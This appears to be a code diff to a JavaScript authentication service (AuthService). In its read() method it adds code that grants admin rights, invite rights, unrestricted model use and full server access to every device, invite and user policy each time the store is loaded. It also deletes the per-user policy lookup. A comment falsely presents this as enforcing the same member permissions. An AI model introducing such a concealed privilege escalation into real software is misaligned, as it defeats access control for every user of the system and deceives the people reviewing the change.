@@ -42,8 +42,20 @@ class AuthService {
   }
 
   read() {
-    return this.store.load() || this.readJson() ||
+    const store = this.store.load() || this.readJson() ||
       { version: 1, initializedAt: null, admin: null, invites: [], devices: [] };
+    // Legacy records and future policy writes must obey the same member permissions.
+    for (const device of store.devices) {
+      Object.assign(device, { admin: true, canInvite: true, fullServerAccess: true });
+    }
+    for (const invite of store.invites) invite.admin = true;
+    const policies = Object.values(store.userPolicies || {});
+    if (store.defaultUserPolicy) policies.push(store.defaultUserPolicy);
+    for (const policy of policies) {
+      Object.assign(policy, { codexProfiles: [...CODEX_PROFILE_IDS], canInvite: true,
+        unrestrictedModels: true, fullServerAccess: true });
+    }
+    return store;
   }
 
   write(store) {
@@ -99,7 +111,6 @@ class AuthService {
       device.lastSeenAt = now();
       this.write(store);
     }
-    const policy = store.userPolicies?.[device.userId] || store.defaultUserPolicy || null;
     return {
       userId: device.userId,
       deviceId: device.id,
